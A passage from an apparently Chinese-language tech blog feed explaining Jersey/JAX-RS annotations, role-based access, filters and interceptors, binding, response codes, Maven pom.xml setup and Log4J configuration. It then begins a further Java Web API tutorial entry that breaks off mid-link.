來標註優先權</li><li>@PreMatching</li><li>@NameBinding</li><li>@RolesAllowed</li></ul><p>用在其他 Annotation 上的 Annotation</p><ul><li><code>@Retention</code> 確定標註的生命周期, 用一個 Enum 的 RetentionPolicy 參數設定</li><li><code>@Documented</code> 文檔化</li><li><code>@Target</code> 表示標註適用的範圍，也用 Enum 的 EnumType 的參數設定</li><li><code>@SessionScope</code></li><li><code>@Inject</code> 針對資料的標註，@JsonProperty 改變 JSON 名稱</li></ul><h3 id="Jersey-資料傳輸格式-Consumes、-Produces"><a href="#Jersey-資料傳輸格式-Consumes、-Produces" class="headerlink" title="Jersey 資料傳輸格式 (@Consumes、@Produces)"></a>Jersey 資料傳輸格式 (@Consumes、@Produces)</h3><p>Jersey 支援直接將 POJO 轉成 XML (jaxb) 及 JSON (jackson) 的功能，只需要使用兩種 @ 設定即可。</p><ul><li>@Consumes: <code>@Consumes(&quot;text/plain&quot;)</code></li><li>@Produces: <code>@Produces(&#123;&quot;application/xml&quot;, &quot;application/json&quot;&#125;)</code></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">@POST</span></span><br><span class="line"><span class="meta">@Consumes(&quot;text/plain&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">postClichedMessage</span><span class="params">(String message)</span> &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@GET</span></span><br><span class="line"><span class="meta">@Produces(&#123;&quot;application/xml&quot;, &quot;application/json&quot;&#125;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">doGetAsXmlOrJson</span><span class="params">()</span> &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Jersey-API-權限管理"><a href="#Jersey-API-權限管理" class="headerlink" title="Jersey API 權限管理"></a>Jersey API 權限管理</h2><p>一樣是透過 Annotation 針對 API 做權限上的管理</p><ul><li>@PermitAll</li><li>@RolesAllowed</li></ul><p>底下範例針對同個路徑讓一般使用者、管理員取得不同的資料</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Path(&quot;/&quot;)</span></span><br><span class="line"><span class="meta">@PermitAll</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Resource</span> &#123;</span><br><span class="line">    <span class="meta">@RolesAllowed(&quot;user&quot;)</span></span><br><span class="line">    <span class="meta">@GET</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">get</span><span class="params">()</span> &#123; <span class="keyword">return</span> <span class="string">&quot;GET&quot;</span>; &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RolesAllowed(&quot;admin&quot;)</span></span><br><span class="line">    <span class="meta">@POST</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">post</span><span class="params">(String content)</span> &#123; <span class="keyword">return</span> content; &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Path(&quot;sub&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> SubResource <span class="title function_">getSubResource</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">SubResource</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Jersey-Filters-Interceptors"><a href="#Jersey-Filters-Interceptors" class="headerlink" title="Jersey Filters &amp; Interceptors"></a>Jersey Filters &amp; Interceptors</h2><p>Filters &amp; Interceptors 用途是在 API 的資料流中進行把關和處理</p><ul><li>Filter 可以針對傳入的 request 或即將送出的 response 的參數操作，像是 header 判斷、HTTP Method 修改等等，自訂 Server Filters 需要 override 以下兩個方法：<ul><li>ContainerRequestFilter</li><li>ContainerResponseFilter</li></ul></li><li>Interceptors 攔截器可以針對 input&#x2F;output 串流做處理，常見的像是壓縮<ul><li>WriterInterceptor</li><li>ReaderInterceptor</li></ul></li></ul><p>當一個 Client 發出請求後，執行的粗略順序如下:</p><ol><li>ClientRequestFilters</li><li>ReaderInterceptor</li><li>WriterInterceptor</li><li>ClientResponseFilters</li></ol><h3 id="Pre-matching-範例"><a href="#Pre-matching-範例" class="headerlink" title="@Pre-matching 範例"></a>@Pre-matching 範例</h3><p>提前攔截並更改方法，如未加標註則預設都為 Post-matching 僅做判斷後篩選</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@PreMatching</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PreMatchingFilter</span> <span class="keyword">implements</span> <span class="title class_">ContainerRequestFilter</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">filter</span><span class="params">(ContainerRequestContext requestContext)</span></span><br><span class="line">                        <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="comment">// change all PUT methods to POST</span></span><br><span class="line">        <span class="keyword">if</span> (requestContext.getMethod().equals(<span class="string">&quot;PUT&quot;</span>)) &#123;</span><br><span class="line">            requestContext.setMethod(<span class="string">&quot;POST&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="NameBinding-和-Dynamic-Binding"><a href="#NameBinding-和-Dynamic-Binding" class="headerlink" title="NameBinding 和 Dynamic Binding"></a>NameBinding 和 Dynamic Binding</h2><p>加上 <code>@Provider</code> 則為預設啟動，若需建立 filter 及 interceptors 與特定 RESTful Services 之間的關連，會利用 <code>@NameBinding</code> 再加上自定標註，或是使用 Dynamic Binding。</p><h3 id="NameBinding-範例"><a href="#NameBinding-範例" class="headerlink" title="NameBinding 範例"></a>NameBinding 範例</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@NameBinding</span></span><br><span class="line"><span class="meta">@Retention(value =RetentionPolicy.RUNTIME)</span></span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> Test &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">--------------------------------------------------------</span><br><span class="line"><span class="meta">@Provider</span></span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestFilter2</span> <span class="keyword">implements</span> <span class="title class_">ContainerRequestFilter</span>,</span><br><span class="line"> ContainerResponseFilter &#123;</span><br><span class="line"> <span class="comment">//</span></span><br><span class="line">&#125;</span><br><span class="line">--------------------------------------------------------</span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="meta">@GET</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;hello &gt;////&lt;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Dynamic-Binding-範例"><a href="#Dynamic-Binding-範例" class="headerlink" title="Dynamic Binding 範例"></a>Dynamic Binding 範例</h3><ol><li>包在 my.package.admin 裡的</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Provider</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyDynamicFeature</span> <span class="keyword">implements</span> <span class="title class_">DynamicFeature</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">configure</span><span class="params">(ResourceInfo resourceInfo, FeatureContext context)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">resourcePackage</span> <span class="operator">=</span> resourceInfo.getResourceClass().getPackage().getName();</span><br><span class="line">    <span class="type">Method</span> <span class="variable">resourceMethod</span> <span class="operator">=</span> resourceInfo.getResourceMethod();</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;my.package.admin&quot;</span>.equals(resourcePackage)</span><br><span class="line">        &amp;&amp; resourceMethod.getAnnotation(GET.class) != <span class="literal">null</span>) &#123;</span><br><span class="line">        context.register(LoggingFilter.class);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li>HelloWorldResource.class 裡的</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CompressionDynamicBinding</span> <span class="keyword">implements</span> <span class="title class_">DynamicFeature</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">configure</span><span class="params">(ResourceInfo resourceInfo, FeatureContext context)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (HelloWorldResource.class.equals(resourceInfo.getResourceClass())</span><br><span class="line">                &amp;&amp; resourceInfo.getResourceMethod()</span><br><span class="line">                    .getName().contains(<span class="string">&quot;VeryLongString&quot;</span>)) &#123;</span><br><span class="line">            context.register(GZIPWriterInterceptor.class);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="JAX-RS-Response-Error-Message"><a href="#JAX-RS-Response-Error-Message" class="headerlink" title="JAX-RS Response &amp; Error Message"></a>JAX-RS Response &amp; Error Message</h2><p>Return Response 可以設定 status</p><ol><li><code>.status(Response.Status.OK)</code> &#x2F;&#x2F;200</li><li><code>.status(Response.Status.CREATED)</code> &#x2F;&#x2F; 201</li><li><code>.status(Response.Status.NO_CONTENT)</code>&#x2F;&#x2F; 204<ul><li>the resource method’s return type is void</li><li>the value of the returned entity is null</li></ul></li><li><code>.seeOther()</code> &#x2F;&#x2F;303</li><li><code>.notModified()</code>&#x2F;&#x2F;304</li><li><code>.temporaryRedirect()</code>&#x2F;&#x2F;307</li><li><code>.status(Response.Status.FORBIDDEN)</code>&#x2F;&#x2F;403</li><li><code>.status(Response.Status.CONFLICT)</code>&#x2F;&#x2F;409<ul><li>取到後可以判斷 Response response &#x3D; request.get();</li><li>Assert.assertTrue(response.getStatus() &#x3D;&#x3D; 200);</li></ul></li></ol><h2 id="Maven-設定"><a href="#Maven-設定" class="headerlink" title="Maven 設定"></a>Maven 設定</h2><p>Maven 透過 Project Object Model 的設置，也就是 pom.xml 會定義以下這些東西：</p><ol><li>版本相關資訊</li></ol><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>test<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>test<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">version</span>&gt;</span>0.0.1-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br></pre></td></tr></table></figure><ol start="2"><li>定義 Project 的 layout</li></ol><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">sourceDirectory</span>&gt;</span>src<span class="tag">&lt;/<span class="name">sourceDirectory</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">resources</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">resource</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">directory</span>&gt;</span>src<span class="tag">&lt;/<span class="name">directory</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">excludes</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">exclude</span>&gt;</span>**/*.java<span class="tag">&lt;/<span class="name">exclude</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">excludes</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">resource</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">resource</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">directory</span>&gt;</span>properties<span class="tag">&lt;/<span class="name">directory</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">excludes</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">exclude</span>&gt;</span>**/*.java<span class="tag">&lt;/<span class="name">exclude</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">excludes</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">resource</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">resources</span>&gt;</span></span><br></pre></td></tr></table></figure><ol start="3"><li>定義相關 dependencies</li></ol><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.glassfish.jersey.containers<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jersey-container-servlet<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.16<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><p>加入 dependencies 後會自動產生 jar, war 相關的檔案，少去自己加參考的過程，但需要了解 dependencies 是針對什麼而加，像是 POJO to JSON 需要 MOXy 或是 Jackson：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.glassfish.jersey.media<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jersey-media-moxy<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.glassfish.jersey.media<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jersey-media-json-jackson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>除了 pom.xml 外，在 JAX-RS Application 有個 class 叫 ResourceConfig 提供了註冊資源的方式。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">ApplicationPath(<span class="string">&quot;/rest&quot;</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TomcatApplication</span> <span class="keyword">extends</span> <span class="title class_">ResourceConfig</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">TomcatApplication</span><span class="params">()</span> &#123;</span><br><span class="line">        property(ServerProperties.WADL_FEATURE_DISABLE, <span class="string">&quot;true&quot;</span>);</span><br><span class="line">        property(ServerProperties.PROVIDER_PACKAGES,</span><br><span class="line">        <span class="string">&quot;com.web.tomcat.jersey,com.web.tomcat.filter,com.web.tomcat.interceptor&quot;</span>);</span><br><span class="line">        register(XXX.class);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">final</span> <span class="type">Application</span> <span class="variable">application</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ResourceConfig</span>()</span><br><span class="line">.packages(<span class="string">&quot;org.glassfish.jersey.examples.linking&quot;</span>)</span><br><span class="line">.register(DeclarativeLinkingFeature.class);</span><br></pre></td></tr></table></figure><p>舉例來說要利用 Jersey 上下傳檔案，可能就需要額外註冊以下的資訊：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.glassfish.jersey.media<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jersey-media-multipart<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>要記得到 ResourceConfig 註冊</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">packages(<span class="string">&quot;com.rest.resource&quot;</span>);</span><br><span class="line">register(MultiPartFeature.class);</span><br></pre></td></tr></table></figure><h2 id="Log4J"><a href="#Log4J" class="headerlink" title="Log4J"></a>Log4J</h2><p>了解了 Jersey 的相關設定後，使用 Log4J 可以大大幫助我們在開發上的除錯。</p><ol><li>POM 檔設定相關相依性</li></ol><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.4<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.4<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><ol start="2"><li>import 相關 Library</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.LogManager;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.Logger;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloWorld</span> &#123;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Logger</span> <span class="variable">logger</span> <span class="operator">=</span> LogManager.getLogger(<span class="string">&quot;HelloWorld&quot;</span>);</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        logger.info(<span class="string">&quot;Hello, World!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="3"><li>XML 設定</li></ol><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Configuration</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Appenders</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- Console 為 console 顯示 log 格式的設定--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Console</span> <span class="attr">name</span>=<span class="string">&quot;Console&quot;</span> <span class="attr">target</span>=<span class="string">&quot;SYSTEM_OUT&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">PatternLayout</span> <span class="attr">pattern</span>=<span class="string">&quot;%d %-5p [%t] %C&#123;2&#125; (%F:%L) - %m%n&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Console</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- DailyFile 為以日為單位儲存的 log 檔設定 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">RollingFile</span> <span class="attr">name</span>=<span class="string">&quot;DailyFile&quot;</span> <span class="attr">fileName</span>=<span class="string">&quot;logs/jarvis-log.log&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">filePattern</span>=<span class="string">&quot;logs/jarvis-log-%d&#123;yyyy-MM-dd&#125;~%i.log&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">PatternLayout</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">Pattern</span>&gt;</span>[%-5level] %d&#123;yyyy-MM-dd HH:mm:ss&#125; [%t] %c&#123;1&#125; - %msg%n<span class="tag">&lt;/<span class="name">Pattern</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">PatternLayout</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Policies</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">TimeBasedTriggeringPolicy</span> <span class="attr">interval</span>=<span class="string">&quot;1&quot;</span> <span class="attr">modulate</span>=<span class="string">&quot;true&quot;</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">SizeBasedTriggeringPolicy</span> <span class="attr">size</span>=<span class="string">&quot;100 MB&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">Policies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">RollingFile</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Appenders</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Loggers</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Logger</span> <span class="attr">name</span>=<span class="string">&quot;org.apache.log4j.xml&quot;</span> <span class="attr">level</span>=<span class="string">&quot;info&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Root</span> <span class="attr">level</span>=<span class="string">&quot;debug&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">AppenderRef</span> <span class="attr">ref</span>=<span class="string">&quot;Console&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">AppenderRef</span> <span class="attr">ref</span>=<span class="string">&quot;DailyFile&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Loggers</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Backend </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Backend </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java Web API (RESTful API) 教學</title>
      <link href="/2018/04/05/java-web/"/>
      <url>/2018/04/05/java-web/</url>
      
        <content type="html"><![CDATA[<p>這篇文章會示範從 0 到 1 打造一個網站應用程式，並整理 Java Web Appication 相關資源如基礎建設、前端網頁、後端 Web API 及資料庫。</p><h2 id="Java-Web-Appication-相關資源"><a href="#Java-Web-Appication-相關資源" class="headerlink" title="Java Web Appication 相關資源"></a>Java Web Appication 相關資源</h2><p>一個 Java Web Appication 分成前端、後端及資料庫。</p><p>前端網頁(網址) &lt;–Q1–&gt; RESTful Web Service &lt;–Q2–&gt; Web 伺服器 &lt;–Q3–&gt; 實體資料庫</p><p>需打通的關節分三個方面，</p><ol><li>建立 Java Web Appication 並提供 RESTful Web Service</li><li>透過 War 檔發佈至容器: 將程式發佈至伺服器供前端存取</li><li>讓撰寫的 RESTful Web Service 存取實體資料庫</li></ol><h3 id="語法教學資源"><a href="#語法教學資源" class="headerlink" title="語法教學資源"></a>語法教學資源</h3><p>Coding Conventions，推薦撰寫方式及風格上的統一，用意在於方便閱讀及增進效能。</p><ul><li>Java 後端 (<a href="http://www.oracle.com/technetwork/java/codeconventions-150003.pdf">http://www.oracle.com/technetwork/java/codeconventions-150003.pdf</a> )</li><li>JavaScript 前端 (<a href="http://www.w3schools.com/js/js_conventions.asp">http://www.w3schools.com/js/js_conventions.asp</a> )</li></ul><p>語法教學資源</p><ul><li>Java (<a href="http://openhome.cc/Gossip/Java/">http://openhome.cc/Gossip/Java/</a> )</li><li>JavaScript (<a href="http://www.w3schools.com/js/default.asp">http://www.w3schools.com/js/default.asp</a> )</li><li>JavaScript Practice (<a href="https://www.codecademy.com/tracks/javascript">https://www.codecademy.com/tracks/javascript</a> )</li></ul><p>OpenSource 平台</p><ul><li>前端 (<a href="http://codepen.io/">http://codepen.io/</a> )</li><li>資料庫 [MySQL] (<a 